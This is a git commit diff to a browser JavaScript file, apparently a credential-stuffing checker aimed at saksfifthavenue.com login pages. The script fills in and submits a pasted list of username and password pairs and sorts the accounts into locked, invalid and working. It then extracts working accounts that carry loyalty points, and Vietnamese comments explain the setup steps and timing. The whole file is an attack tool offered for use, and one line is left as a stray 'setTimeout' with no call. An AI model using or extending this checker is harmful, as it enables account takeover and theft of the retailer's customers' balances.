db85458eff018fe82b17834029c39b75b5bd5c7b
Đào Hùng <memsenpai3@gmail.com>
2018-11-28 20:09:07 +0700

    Update sask-2.js

--- sask-2.js
+++ sask-2.js
@@ -28,28 +28,22 @@ function login(){
         localStorage.setItem('data_input', JSON.stringify(data_input));
         localStorage.setItem('data_checked', JSON.stringify(data_checked));
 
-        var number = setInterval(() => {
-            if(!document.querySelector('.account__alert'))
-                document.querySelector('.sign-into-account__submit-button').click();
-        }, 2000)   
+        if(!document.querySelector('.account__alert'))
+            document.querySelector('.sign-into-account__submit-button').click();
         setTimeout(() => {
             if(document.querySelector('.sign-in__account-locked')){
 
                 data_lock.push([username, password])
                 localStorage.setItem('data_lock', JSON.stringify(data_lock));
-                document.location.pathname = rand
-                var win = window.open(url[Math.floor(Math.random() * url.length)], '_blank');
-                win.close()
-                window.clearInterval(number);
+                document.location.reload()
+                
 
             } else if(document.querySelector('.account__alert')){
 
                 data_invalid.push([username, password])
                 localStorage.setItem('data_invalid', JSON.stringify(data_invalid));
-                window.clearInterval(number);     
-                document.location.pathname = rand
-                var win = window.open(url[Math.floor(Math.random() * url.length)], '_blank');
-                win.close()
+                     
+                document.location.reload()
 
             } else if(!document.querySelector('.account-header__greeting')){
 
@@ -57,20 +51,20 @@ function login(){
                 localStorage.setItem('data_input', JSON.stringify(data_input));
                 data_checked.pop();
                 localStorage.setItem('data_checked', JSON.stringify(data_checked));  
-                window.clearInterval(number);     
+                     
                            
                 document.location.pathname = rand
-                var win = window.open(url[Math.floor(Math.random() * url.length)], '_blank');
-                win.close()
 
+            } else {
+              document.location.reload()
             }
         },7000) //  thoi gian cho truoc khi check xem login duoc hay khong, mac dinh 7s
-    }, 5000) // thoi gian cho trc khi dien mat khau va email de login, giam xuong neu muon tang toc, hien tai la 5s
-    setTimeout(() => document.location.reload(), 10000);
+    }, 3000) // thoi gian cho trc khi dien mat khau va email de login, giam xuong neu muon tang toc, hien tai la 5s
 }
 
 if(document.location.pathname=='/account/login' && data_input.length > 0){
-    login()    
+    login() 
+    setTimeout   
 }
 
 if(document.location.pathname == "/Entry.jsp"){
@@ -130,3 +124,27 @@ if(document.location.pathname.match(/\/v1\/account-service[^]*/)){
     document.location.href = 'https://www.saksfifthavenue.com/account/summary';
 
 }
+
+// init data copy cai nay paste vao console dau tien, nho dien data raw vao input_string
+var data_input = []
+ var input_string = ''
+ input_string = input_string.split(';');
+ input_string.forEach((ele) => {
+     data_input.push(ele.split(' | '));
+ })
+ localStorage.setItem('data_input' , JSON.stringify(data_input));
+ localStorage.setItem('data_lock' , JSON.stringify([]));
+ localStorage.setItem('data_invalid' , JSON.stringify([]));
+ localStorage.setItem('data_checked' , JSON.stringify([]));
+ // cach lay data sau khi check
+ var data_input = JSON.parse(localStorage.getItem('data_input'));
+ var data_lock = JSON.parse(localStorage.getItem('data_lock'));
+ var data_invalid = JSON.parse(localStorage.getItem('data_invalid'));
+ var data_checked = JSON.parse(localStorage.getItem('data_checked'));
+ checked_has_point = data_checked.filter(ele => {return ele.length ==3}); // lay ra nhung account da check ma co point;
+var string_need = '';
+checked_has_point.forEach(ele => {
+    string_need += ele[0] + ' | ' + ele[1] + ' | ' + (ele[2] == "" ? 0 : ele[2]) + ';'
+})
+string_need // chuoi can lay
+//lay chuoi nay sang file khac roi replace ';' bang dau '\n' 
